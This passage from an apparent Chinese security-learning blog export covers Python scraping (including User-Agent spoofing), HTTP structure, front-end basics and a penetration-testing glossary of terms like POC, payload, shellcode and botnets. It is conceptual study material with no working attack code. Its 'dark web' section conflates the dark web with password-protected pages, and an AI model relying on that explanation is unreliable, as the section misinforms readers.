urllib.request.urlopen(&#39;http://www.baidu.com&#39;)\n查看返回信息:\npythonprint(r.read().decode(&#39;utf-8&#39;))返回了网页源码\n\n\nurlopen方法\nurlopen方法有三个参数\npythonurllib.request.urlopen(url, data=None, [timeout, ]*)\ndata: 给post请求携带参数, 比如在模拟登录时传入用户名和密码\n\ntimeout: 设置请求超时时间\n\nurlopen 默认是 Get 请求, 当我们传入参数它就为 Post 请求了\n\n\nRequest方法\nRequest方法有四个参数:\npythonurllib.request.Request(url, data=None, headers=&#123;&#125;, method=None)\nheaders: 请求头信息\n\nmethod: 设置请求方式\n\n\nrequests库发送请求\nGET请求示例:\npythonimport requests\n\n\nr = requests.get(&quot;https://www.bilibili.com/&quot;)\nprint(r)\nprint(r.ok)  输出(失败):\ntxt&lt;Response [412]&gt;\nFalse\n修改请求头, 模拟浏览器访问:\npythonimport requests\n\n\nheaders = &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot;\n&#125;\nr = requests.get(&quot;https://www.bilibili.com/&quot;, headers=headers)\nprint(r)\nprint(r.ok)输出(成功):\ntxt&lt;Response [200]&gt;\nTrue\n\n正则表达式匹配导入模块-re\npythonimport re\n\n捕获组\n要获取的字段要用括号( )括起来\n\n匹配:re.match函数\n函数语法\npythonre.match(pattern, string, flags=0)\n\n\n参数\n描述\n\n\n\npattern\n匹配的正则表达式\n\n\nstring\n要匹配的字符串。\n\n\nflags\n标志位，用于控制正则表达式的匹配方式\n\n\n\n\n\n修饰符\n描述\n\n\n\nre.I\n使匹配对大小写不敏感\n\n\nre.L\n做本地化识别（locale-aware）匹配\n\n\nre.M\n多行匹配，影响 ^ 和 $\n\n\nre.S\n使 . 匹配包括换行在内的所有字符\n\n\nre.U\n根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.\n\n\nre.X\n该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。\n\n\n\n返回:\n\n匹配成功 re.match 方法返回一个匹配的对象，否则返回 None。\n可使用 group(num) 或 groups() 来获取匹配表达式。\n\n\n示例:\npythoncontent = &#39;Hello 100 World!&#39;\nres = re.match(r&#39;^He.*?(\\d+)\\s.*!$&#39;, content)\nprint(res.group(1))输出:\ntxt100\n\n查找\n查找第一个:\npythonres = re.search(r&#39;[\\d]&#123;3&#125;&#39;, content)\n查找所有:\npythonres = re.findall(r&#39;[\\d]&#123;3&#125;&#39;, content)\n\n封装匹配方式\npythonpattern = re.compile(&#39;Xi.*?(\\d+)\\s.*s&#39;,re.S)\n\nBeautifulSoup解析获取的html文件\n示例:\npythonimport requests\nfrom bs4 import BeautifulSoup\n\nheaders = &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot;\n&#125;\n    response = requests.get(f&quot;https://movie.douban.com/top250)\n    content = response.text\n                            \n    soup = BeautifulSoup(content, &quot;html.parser&quot;)\n    title = soup.find_all(&quot;div&quot;, &#123;&quot;class&quot;: &quot;info&quot;&#125;)\n    for info in title:\n        for hd in info.find_all(&quot;div&quot;, &#123;&quot;class&quot;: &quot;hd&quot;&#125;):\n            print(hd.find(&quot;span&quot;, &#123;&quot;class&quot;: &quot;title&quot;&#125;).string)输出:\ntxt肖申克的救赎\n霸王别姬\n阿甘正传\n泰坦尼克号\n这个杀手不太冷\n千与千寻\n美丽人生\n星际穿越\n盗梦空间\n..\nsoup = BeautifulSoup(content, &quot;html.parser&quot;), 解析content中的HTML\n\nXX.find()返回查找的第一个\n\nXX.find_all()返回找到的全部内容的一个列表\n\n\nSelenium自动化工具安装与导入\nshpip install selenium\npythonfrom selenium import webdriver\n\n示例\npythonfrom selenium import webdriver\n\n\ndriver = webdriver.Chrome() # 创建一个web驱动(Chrome驱动)实例\ndriver.get(&quot;https://www.baidu.com&quot;) # 打开网页\n\ninput = driver.find_element(&#39;css selector&#39;, &#39;#kw&#39;) # 找到输入框\ninput.send_keys(&#39;图片&#39;) # 输入内容\n\nbutton = driver.find_element(&#39;css selector&#39;, &#39;#su&#39;) # 找到按钮\nbutton.click() # 点击按钮\n效果与真正的用户操作几乎一样:\n\n\n\n常用方法获取元素\nfind_element():获取单个元素\nfind_elements(): 获取多个元素\n第一个参数’by’用于指定获取搜索目标, 包括id, name, xpath, link text, partial link text, tag name, class name, css selector\n\n输入内容\nsend_key()\n\n获取信息\ncurrent_url获取请求链接\nget_cookies()获取 cookies\npage_source获取源代码\ninput.text获取文本的值\n\n多线程","slug":"Python爬虫基础","date":"2024-01-28T05:33:12.000Z","categories_index":"","tags_index":"网络安全,学习日志,Python基础","author_index":"Myprefer"},{"id":"fc05fbb308fc2fe612857f2de1b31069","title":"HTTP协议请求结构","content":"HTTP协议\nHTTP: Hypertext Transfer Protocol\n作用: 是一种用于传输超文本的协议。\n是客户端和服务器之间进行通信的基础，常用于在Web浏览器和Web服务器之间传输数据。\n客户端与服务端之间通过交换一个个独立的消息进行通信, 客户端发出的称为请求, 服务端发出的应答消息称为响应\n\n\n\nHTTP请求的基本结构示例:\nhttpPOST /api/login HTTP/1.1 \nHost: example.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\nContent-Type: application/json\n\n&#123;&quot;username&quot;: &quot;user123&quot;, &quot;password&quot;: &quot;pass456&quot;&#125;\n请求行（Request Line）\n请求头（Header）\n请求体（Body）\n\n请求行\n请求行位于请求报文的开头(示例第一行), 包括:\n\n请求方法\nURL\nHTTP版本\n\n\n请求方法:\n\n\n\n\n\n请求方法\n描述\n用途\n\n\n\nGET\n请求获取指定资源\n获取网页、图片、文本等资源\n\n\nPOST\n在服务器上创建新的资源\n提交表单数据、上传文件等\n\n\nPUT\n更新服务器上的资源\n更新已存在的资源\n\n\nDELETE\n请求服务器删除指定资源\n删除资源\n\n\nHEAD\n请求获取响应头信息\n获取资源的头部信息，而不获取资源本身\n\n\nOPTIONS\n请求查看支持的方法\n查询服务器支持的HTTP方法\n\n\nPATCH\n对资源进行部分修改\n部分更新资源\n\n\n请求头\nHTTP请求头提供了关于请求, 响应或者其他的发送实体的信息\n\n示例中:\n\nHost：指定服务器的域名和端口号。\n\nUser-Agent：浏览器或客户端的信息。\n\nContent-Type：请求体的数据类型，如application&#x2F;json。\n\n\n\n其他常见请求头，如Accept、Authorization等, 手册:HTTP 标头（header） - HTTP | MDN (mozilla.org)\n\n\n请求体\n可选, 主要用于再请求中携带一些数据(表单等)\n主要用于POST, PUT等需要向服务器提交数据的请求\nContent-Type请求头用于指示请求体的媒体类型, 例如:\napplication/x-www-form-urlencoded：用于普通表单数据。\nmultipart/form-data：用于文件上传等表单数据。\napplication/json：用于JSON数据。(示例)\ntext/plain：用于纯文本数据等。\n\n\nContent-Type手册: HTTP content-type\n\n\n状态码\n当访问一个网页时, 客户端向服务端发出请求, 服务端返回一个包含HTTP状态码的信息头(server header)\n\n常见的有:\n\n200 - 请求成功\n\n301 - 资源（网页等）被永久转移到其它URL\n\n404 - 请求的资源（网页等）不存在\n\n500 - 内部服务器错误\n\n\n\n状态码分类:\n\n\n\n\n\n分类\n分类描述\n\n\n\n1xx\n信息，服务器收到请求，需要请求者继续执行操作\n\n\n2xx\n成功，操作被成功接收并处理\n\n\n3xx\n重定向，需要进一步的操作以完成请求\n\n\n4xx\n客户端错误，请求包含语法错误或无法完成请求\n\n\n5xx\n服务器错误，服务器在处理请求的过程中发生了错误\n\n\n\n参考手册: HTTP 响应状态码 - HTTP | MDN (mozilla.org)\n\n","slug":"HTTP协议请求结构","date":"2024-01-27T12:53:28.000Z","categories_index":"","tags_index":"网络安全,学习日志","author_index":"Myprefer"},{"id":"004992c1c97a2410f49880be41043864","title":"前端三剑客: HTML/CSS/JavaScript","content":"HTML:结构\nHTML是一种超文本标记语言，不是一种编程语言\n\n主要用来实现静态页面，我们在页面看到的文本，图片，视频，声音，表格，链接等都是通过HTML语言描述的\n\nHTML的是由标签组成，给不同的标签不同的属性，可以实现不同的网页效果。\n\n页面基本结构:\nhtml&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=&quot;UTF-8&quot;&gt;\n&lt;title&gt;\n页面标题&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n \n&lt;h1&gt;一个标题&lt;/h1&gt;\n \n&lt;p&gt;一个段落&lt;/p&gt;\n \n&lt;/body&gt;\n&lt;/html&gt;\n参考手册: HTML 标签列表（功能排序） | 菜鸟教程 \n\n\nCSS:修饰介绍\nCSS 用于 HTML 文档中元素样式的定义\n使用 CSS 的目的就是让网页具有美观一致的页面\n\n参考手册\nCSS 参考手册 | 菜鸟教程 (runoob.com)\n\n基础语法选择器\n元素选择器：选择特定类型的元素，如 p 表示段落。\ncssinput &#123;\n    width: 250px;\n    padding: 10px;\n    margin-bottom: 10px;\n    border: 1px solid #bfbcbc;\n    border-radius: 4px;\n&#125;使用示例:\nhtml&lt;input type=&quot;text&quot; id=&quot;phoneNumber&quot; name=&quot;phoneNumber&quot; required&gt;使用前:\n\n使用后: 可以看到输入框(input)改变了\n\n\n类选择器：选择具有特定类的元素，如 .highlight 表示具有 highlight 类的元素。\ncssh1.textStyle &#123;\n    text-align: center;\n    /*仅一级标题(h1)能够使用*/\n    /*如果直接写  .textStyle , 所有元素都可以使用*/\n&#125;使用示例: \nhtml &lt;h1 class=&quot;textStyle&quot;&gt;模拟登录&lt;/h1&gt;使用前:\n\n使用后: 可以看到, 标题文字被居中\n\nID选择器：选择具有特定ID的元素，如 #header 表示具有 header ID 的元素。\ncss#loginForm &#123;\n    width: 300px;\n    margin: 0 auto;\n    padding: 20px;\n    border: 1px solid #6e6c6c;\n    border-radius: 5px;\n&#125;使用示例:\nhtml&lt;form id=&quot;loginForm&quot;&gt;\n        &lt;label for=&quot;phoneNumber&quot;&gt;手机号：&lt;/label&gt;\n        &lt;input type=&quot;text&quot; id=&quot;phoneNumber&quot; name=&quot;phoneNumber&quot; required&gt;\n        &lt;button type=&quot;submit&quot;&gt;登录&lt;/button&gt;\n&lt;/form&gt;使用前:\n使用后: 可以看到, 整个表单的属性改变了\n\n\n\nCSS创建\n内部样式表: 在html文件头部(&lt;head&gt;)用&lt;style&gt;定义样式表, 例如:\nhtml&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;模拟登录&lt;/title&gt;\n    &lt;style&gt;\n        #loginForm &#123;\n            width: 300px;\n            margin: 0 auto;\n            padding: 20px;\n            border: 1px solid #6e6c6c;\n            border-radius: 5px;\n        &#125;\n        &lt;!--省略其他选择器--&gt;\n    &lt;/style&gt;\n&lt;/head&gt;\n外部样式表: 将样式表保存在外部文件中, 在html的中使用链接到样式表, 例如\nhtml&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;title&gt;模拟登录&lt;/title&gt;\n    &lt;link rel=&quot;stylesheet&quot; href=&quot;style/test1.css&quot;&gt;\n&lt;/head&gt;style&#x2F;test1.css:\ncss #loginForm &#123;\n     width: 300px;\n     margin: 0 auto;\n     padding: 20px;\n     border: 1px solid #6e6c6c;\n     border-radius: 5px;\n &#125;\n\ninput &#123;\n    width: 250px;\n    padding: 10px;\n    margin-bottom: 10px;\n    border: 1px solid #bfbcbc;\n    border-radius: 4px;\n&#125;\n\nh1.textStyle &#123;\n    text-align: center;\t\n&#125;\n内联样式: 在相关的标签内直接使用样式（style）属性, 例如\nhtml&lt;p style=&quot;color:sienna;margin-left:20px&quot;&gt;这是一个段落。&lt;/p&gt;慎用, 建议只在一个元素上使用一次时使用\n\n多重样式优先级: 内联 &gt; 内部 &gt; 外部 &gt; 浏览器默认\n\n\n\nJavaScript:行动介绍\nJavaScript是一门轻量级的脚本语言，是一种运行在客户端的脚本语言 \n\n\n\n\n\n\n\n\n\nScript 是脚本的意思\n脚本语言：不需要编译，运行过程中由 js 解释器(js 引擎）逐行来进行解释并执行\n\n不同于Java程序运行在JVM中，JavaScript运行是直接运行在浏览器中\n\n主要使用来实现页面功能和业务逻辑\n\n\n参考手册\nJavaScript 和 HTML DOM 参考手册 | 菜鸟教程 (runoob.com)\n\n基础作用\n直接写入 HTML 输出流\n\n对事件的响应\n\n改变 HTML 内容, 图像, 样式\n\n验证输入\n\n\nJavaScript使用\nHTML中的 JS 代码必须在&lt;script&gt;标签中,   可以在&lt;head&gt;或&lt;body&gt;部分中, 例如:\nhtml&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;zh-CN&quot;&gt;\n    &lt;head&gt;\n        &lt;meta charset=&quot;utf-8&quot;&gt;\n        &lt;title&gt;learn01&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;script&gt;\n            document.write(&quot;hello world!&quot;)\n        &lt;/script&gt;\n    &lt;/body&gt;\n&lt;/html&gt;效果: \n\n\n函数: 在触发某种事件的时候可以调用函数, 以实现某些交互效果, 例如:\nhtml&lt;!DOCTYPE html&gt;\n&lt;html lang=&quot;en&quot;&gt;\n\n&lt;head&gt;\n    &lt;meta charset=&quot;UTF-8&quot;&gt;\n    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n    &lt;title&gt;Document&lt;/title&gt;\n    &lt;script&gt;\n        function test() &#123;\n            document.getElementById(&quot;demo&quot;).innerHTML = &quot;Hello world!&quot;;\n        &#125;\n    &lt;/script&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n    &lt;p id=&quot;demo&quot;&gt;\n        一个段落\n    &lt;/p&gt;\n    &lt;button type=&quot;button&quot; onclick=&quot;test()&quot;&gt;\n        点我\n    &lt;/button&gt;\n&lt;/body&gt;\n\n&lt;/html&gt;点击后, 页面会出现一些变化\n\n\n\n外部的JavaScript:在&lt;script&gt;标签的”src”属性中设置 JS 文件的路径, 例如:\nhtml&lt;script src=&quot;script/script01.js&quot;&gt;&lt;/script&gt;\n\n输出\n显示数据:\n使用 window.alert() 弹出警告框。\n使用 document.write() 方法将内容写到 HTML 文档中。\n使用 innerHTML 写入到 HTML 元素。\n使用 console.log() 写入到浏览器的控制台。在Console菜单中\n\n\n操作HTML元素: 用”id”属性标识元素, 用document.getElementById(id) 方法查找该元素, 使用innerHTML()来获取或插入元素内容, 如上\n\n事件\nHTML 事件可以是浏览器行为，也可以是用户行为, 实例：\n\nHTML 页面完成加载\nHTML input 字段改变时\nHTML 按钮被点击\n\n\n事件手册: HTML 事件参考手册\n\n触发时调用 JS :\nhtml&lt;some-HTML-element some-event=&quot;JavaScript 代码&quot;&gt;例如: \nhtml&lt;button type=&quot;button&quot; onclick=&quot;this.innerHTML = Date()&quot;&gt;Time&lt;/button&gt;点击后(触发”onclick”事件)会显示当前时间\n\n\n\nJavaScript DOM\nDOM : Document Object Model, 文档对象模型\n通过HTML DOM, JavaScript能够创建动态HTML, 效果如上(Hello world例子)\nJavaScript HTML DOM\n\nJavaScript BOM\nBOM: Browser Object Model,  浏览器对象模型\n\n简单来说，它就是操作控制浏览器的一种能力，工具, 如获取浏览器信息, 前进, 后退页面, 弹出窗口等\n\n一些基本的形式:\n\n\nJavaScript Window - 浏览器对象模型\n\n\n\n补充: 正则表达式\n一种文本匹配工具, 用于匹配字符串\n\n在线测试工具: regex101: build, test, and debug regex\n\n参考手册: \n\n正则表达式\nlearn-regex\n\n\n语法: \n\n元字符:\n\n?  : 前一个字符可有可无(出现1次或0次), 如ab?c可以匹配ac和abc\n\n* : 前一个字符可以出现0次或任意次, 如ab*c匹配ac, abc, abbbbc\n\n+ : 前一个字符至少出现一次\n\n{数字n} : 更加精确的次数匹配, 前一个字符出现n次\n\n{n1, n2} : 出现n1~n2次\n\n{n1,} : 出现n1次或n1次以上\ntip: *相当于{0,} ,  +相当于{1,} ,  ？相当于{0,1}\n\n(str) : 群, 例如(ab)&#123;3&#125;匹配ababab\n\n[] : 字符种类, 匹配方括号内的任意字符\n\n[^ ] : 否定的字符种类, 匹配除了方括号里的任意字符\n\n^ : 表示开头\n\n$ : 表示末尾\n\n\n\n或运算: (str1|str2), 例如a (ab|cd)匹配a ab和a cd\n\n简写字符集:\n\n\n\n简写\n描述\n\n\n\n.\n除换行符外的所有字符\n\n\n\\w\n匹配所有字母数字，等同于 [a-zA-Z0-9_]\n\n\n\\W\n匹配所有非字母数字，即符号，等同于： [^\\w]\n\n\n\\d\n匹配数字： [0-9]\n\n\n\\D\n匹配非数字： [^\\d]\n\n\n\\s\n匹配所有空格字符，等同于： [\\t\\n\\f\\r\\p&#123;Z&#125;]\n\n\n\\S\n匹配所有非空格字符： [^\\s]\n\n\n\\f\n匹配一个换页符\n\n\n\\n\n匹配一个换行符\n\n\n\\r\n匹配一个回车符\n\n\n\\t\n匹配一个制表符\n\n\n\\v\n匹配一个垂直制表符\n\n\n\\p\n匹配 CR&#x2F;LF（等同于 \\r\\n），用来匹配 DOS 行终止符\n\n\n\n\n\nJS 中的正则表达式: \n\n语法: /正则表达式主体/修饰符(可选)例如: \njsvar reg = /test/itest 是一个正则表达式主体 (用于检索)。\ni 是一个修饰符 (搜索不区分大小写)。\n修饰符:\n\n\n\n修饰符\n描述\n\n\n\ni\n执行对大小写不敏感的匹配。\n\n\ng\n执行全局匹配（查找所有匹配而非在找到第一个匹配后停止）。\n\n\nm\n执行多行匹配。\n\n\n\n使用:\n\nsearch(): 返回第一个匹配项的索引(下标), 没有则返回-1, 例如:\njsconst str = &#39;Hello, World!&#39;; \nconst index1 = str.search(&#39;World&#39;); // 返回 7\nreplace(): 返回被替换后的新字符串, 例如:\njsconst originalString = &#39;Hello, World! Hello, Universe!&#39;;\nconst regex = /Hello/g;\nconst newString = originalString.replace(regex, &quot;Hi&quot;);// 返回: &#39;Hi, World! Hi, Universe!&#39;\ntest(): 检测是否可以匹配, 返回true或false, 例如:\njsvar regex = /^1[3456789]\\d&#123;9&#125;$/\nresult = regex.test(&#39;13873489827&#39;) //返回true\nexec(): 执行搜索, 返回包含匹配的子字符串或null, 例如:\njsconst regex = /(\\d+)-(\\w+)/;\nconst inputString = &#39;2024-January&#39;;\n\n// 使用 exec() 方法执行正则表达式匹配\nconst result = regex.exec(inputString);\n\nif (result) &#123;\n  console.log(&#39;匹配成功:&#39;, result[0]);       // 输出: &#39;2024-January&#39;\n  console.log(&#39;第一个捕获组:&#39;, result[1]);  // 输出: &#39;2024&#39;\n  console.log(&#39;第二个捕获组:&#39;, result[2]);  // 输出: &#39;January&#39;\n&#125; else &#123;\n  console.log(&#39;未找到匹配项&#39;);\n&#125;\n\n\n\n\n\n","slug":"前端三剑客-HTML-CSS-JavaScript","date":"2024-01-27T02:55:51.000Z","categories_index":"","tags_index":"学习日志,前端基础","author_index":"Myprefer"},{"id":"98cd7ae065ea3b0eb521d89df0440426","title":"小迪安全 P2","content":"WEB应用环境架构类中间件容器: 支撑程序运行\n\n\n\n\n\n\n\n\n中间件容器通常是指一种软件环境，用于托管、管理和运行各种中间件服务。中间件容器为应用程序提供了一个统一的平台，使它们能够在不同的环境中无缝运行。这种容器化的方式有助于简化应用程序的部署、管理和扩展。\n以下是一些中间件容器的常见特征和应用场景：\n\n统一的运行环境\n轻量级和可移植性： 中间件容器通常设计为轻量级和可移植的，可以在不同的操作系统和云平台上运行。这有助于简化跨不同环境的部署和迁移。\n自动化和扩展性： 中间件容器通常提供自动化的管理功能，包括自动扩展、负载均衡和故障恢复。这些特性有助于提高系统的可用性和性能。\n容器编排： 一些中间件容器还包括容器编排工具，用于管理和编排多个中间件容器的部署，以便构建分布式和高可用的系统。\n开发和运维的分离\n\nWEB安全漏洞:\nSQL注入, 文件安全, RCE执行, XSS跨站, ……..\n产生原因: 程序源码有问题\n请求(request) —- 返回\n可通过抓包工具获取请求包和返回包\n\nBurp Suite 抓包、改包工具设置代理\nburp suite代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数据、服务端的返回信息等\n\n\n\n","slug":"小迪安全-P2","date":"2024-01-26T13:30:28.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"85481ffdf268686e9e050b9559eb163e","title":"第二周课程-前端与HTML","content":"前端与HTML基本概念请求方法\nGET: 获取资源\n\nPOST: 提交资源\n\n\n\n\n响应状态码\n1XX: 服务器收到请求, 需要继续操作\n2XX: 成功\n3XX: 重定向, (跳转)\n4XX: 用户的问题(客户端错误 语法错误), 常见:\n403: 访问被拒绝\n404: 资源不存在\n\n\n5XX: 服务器的问题\n\n详细:HTTP 响应状态码 - HTTP | MDN (mozilla.org)\nHTTP协议组成\n请求头(标头header): HTTP 标头（header） - HTTP | MDN\nHTTP 请求头各参数具体含义_http请求头包含哪些参数-CSDN博客\n查看请求头: F12进入开发者工具-&gt;网络-&gt;点击名称列查看更加详细信息\n\n请求行, 请求体, http响应\n\n\n\n作业:\n\n\n内容1：在菜鸟教程或W3Sschool进行自主学习前端内容，HTML、JavaScript以及CSS，并记录在笔记中，笔记内容包括概念、代码以及效果截图，笔记情况需要检查。\n\n内容2：学习HTTP协议请求结构，把相关概念与学习情况记录在笔记中，需要检查。\n\n内容3：写一个提交表单进行模拟登录，用户账号是手机号，不需要后端接收，但登录需要配置JS去验证手机号格式输入。\n\n笔记导出成pdf或word或md格式，和模拟登录代码一起打包成压缩包进行提交。\n\n学习: python基础 -&gt; 爬虫\n\n\n","slug":"第二周课程-前端与HTML","date":"2024-01-26T07:03:04.000Z","categories_index":"","tags_index":"网络安全,学习日志,视频会议","author_index":"Myprefer"},{"id":"d93bdcbda8570f036015a41880791d5d","title":"渗透测试常用术语总结","content":"渗透测试常用术语总结\n目录\n\n题记\n渗透测试常用专业术语\n加更：暗网\n转大佬笔记\n一、攻击篇\n二、防守篇\n\n\n题记​     人的一生会遇到两个人，一个惊艳了时光，一个温柔了岁月。        —— 苏剧 《经年》\n\n渗透测试常用专业术语​     相信大家和我一样，搞不清这些专业名词的区别，所以我来整理一下。\n1. POC、EXP、Payload与Shellcode\n\n\n\n\n\n\n\n\nPOC：全称 ‘ Proof of Concept ‘，中文 ‘ 概a念验证 ‘ ，常指一段漏洞证明的代码。\nEXP：全称 ‘ Exploit ‘，中文 ‘ 利用 ‘，指利用系统漏洞进行攻击的动作。\nPayload：中文 ‘ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。\nShellcode：简单翻译 ‘ shell代码 ‘，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。\n2. 几点注意\n\n\n\n\n\n\n\n\nPOC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。\nPayload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。\nShellcode也有很多种，包括正向的，反向的，甚至meterpreter。\nShellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。\n3. Payload模块\n\n\n\n\n\n\n\n\n在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。\n4. 总结\n\n\n\n\n\n\n\n\n想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个POC。之后你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了它家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的录音笔，这一天你所做的就是一个EXP，你在他家所做的就是不同的Payload，就把录音笔当作Shellcode吧！\n\n加更：暗网​    我是会把我遇到很晦涩或者难以理解的词语分享到这的。\n​    暗网这个词是我在b站偶然看到一个叫经常给开发找麻烦的金子姑娘的视频，她的解释让我理解了这个词，所以解释一下。暗网并不是那种灰色交易遍布，人们谁也不认谁，很罪恶的地方，充满着人性的负面。暗网其实就是带密码的空间，就像我们的qq空间。网络世界10%在表面，剩下的就是暗网。浏览器的搜索引擎其实就是利用爬虫把各个网页资源整合到一起，他也有进不去的地方，就像地图软件除了用卫星还有人工测绘人员，他们就像爬虫一样，总有到达不了的暗网。这里提到tor浏览器（洋葱），这个浏览器的原理就是a如果想把消息给b，a把消息给c，c给d，d给e。经过层层代理，导致无法确定人们的踪迹，所以慢慢的这里就成为了罪犯最好的集聚地。这里加一个匿名浏览器tor的详细介绍：https://www.cnblogs.com/liun1994/p/6435505.html          ————2020&#x2F;09&#x2F;19\n\n转大佬笔记一、攻击篇1．攻击工具肉鸡​    所谓“肉鸡”是一种很形象的比喻，比喻那些可以被攻击者控制的电脑、手机、服务器或者其他摄像头、路由器等智能设备，用于发动网络攻击。​    例如在2016年美国东海岸断网事件中，黑客组织控制了大量的联网摄像头用于发动网络攻击，这些摄像头则可被称为“肉鸡”。\n僵尸网络​    僵尸网络 Botnet 是指采用一种或多种传播手段，将大量主机感染病毒，从而在控制者和被感染主机之间所形成的一个可一对多控制的网络。​    僵尸网络是一个非常形象的比喻，众多的计算机在不知不觉中如同中国古老传说中的僵尸群一样被人驱赶和指挥着，成为被攻击者执行各类恶意活动（DDOS、垃圾邮件等）利用的一种基础设施。\n木马​    就是那些表面上伪装成了正常的程序，但是当这些程序运行时，就会获取系统的整个控制权限。\n​    有很多黑客就是热衷使用木马程序来控制别人的电脑，比如灰鸽子、Gh0st、PcShare等等。\n网页木马​    表面上伪装成普通的网页或是将恶意代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马服务端植入到访问者的电脑上来自动执行将受影响的客户电脑变成肉鸡或纳入僵尸网络。\nRootkit​    Rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。​    通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过对方系统存在的安全漏洞获得系统的root或system权限。​    然后，攻击者就会在对方的系统中安装Rootkit，以达到自己长久控制对方的目的，Rootkit功能上与木马和后门很类似，但远比它们要隐蔽。\n蠕虫病毒​    它是一类相对独立的恶意代码，利用了联网系统的开放性特点，通过可远程利用的漏洞自主地进行传播，受到控制终端会变成攻击的发起方，尝试感染更多的系统。​    蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。\n震网病毒​    又名Stuxnet病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。​    作为世界上首个网络“超级破坏性武器”，Stuxnet的计算机病毒已经感染了全球超过 45000个网络，其目标伊朗的铀浓缩设备遭到的攻击最为严重。\n勒索病毒​    主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。\n挖矿木马​    一种将PC、移动设备甚至服务器变为矿机的木马，通常由挖矿团伙植入，用于挖掘比特币从而赚取利益。\n攻击载荷​    攻击载荷（Payload）是系统被攻陷后执行的多阶段恶意代码。​    通常攻击载荷附加于漏洞攻击模块之上，随漏洞攻击一起分发，并可能通过网络获取更多的组件。\n嗅探器（Sniffer）​    就是能够捕获网络报文的设备或程序。嗅探器的正当用处在于分析网络的流量，以便找出所关心的网络中潜在的问题。\n恶意软件​    被设计来达到非授权控制计算机或窃取计算机数据等多种恶意行为的程序。\n间谍软件​    一种能够在用户不知情的情况下，在其电脑、手机上安装后门，具备收集用户信息、监听、偷拍等功能的软件。\n后门​    这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置，用于访问、查看或者控制这台主机。\n​    这些改动表面上是很难被察觉的，就好象是入侵者偷偷的配了一把主人房间的钥匙，或者在不起眼处修了一条按到，可以方便自身随意进出。\n​    通常大多数木马程序都可以被入侵者用于创建后门（BackDoor）。\n弱口令​    指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）。\n漏洞​    漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。​    奇安信集团董事长齐向东在《漏洞》一书中指出，软件的缺陷是漏洞的一个主要来源，缺陷是天生的，漏洞是不可避免的。\n远程命令执行漏洞​    由于系统设计实现上存在的漏洞，攻击者可能通过发送特定的请求或数据导致在受影响的系统上执行攻击者指定的任意命令。\n0day漏洞​    0day漏洞最早的破解是专门针对软件的，叫做WAREZ，后来才发展到游戏，音乐，影视等其他内容的。​    0day中的0表示Zero，早期的0day表示在软件发行后的24小时内就出现破解版本。​    在网络攻防的语境下，0day漏洞指那些已经被攻击者发现掌握并开始利用，但还没有被包括受影响软件厂商在内的公众所知的漏洞，这类漏洞对攻击者来说有完全的信息优势，由于没有漏洞的对应的补丁或临时解决方案，防守方不知道如何防御，攻击者可以达成最大可能的威胁。\n1day漏洞​    指漏洞信息已公开但仍未发布补丁的漏洞。此类漏洞的危害仍然较高，但往往官方会公布部分缓解措施，如关闭部分端口或者服务等。\nNday漏洞​    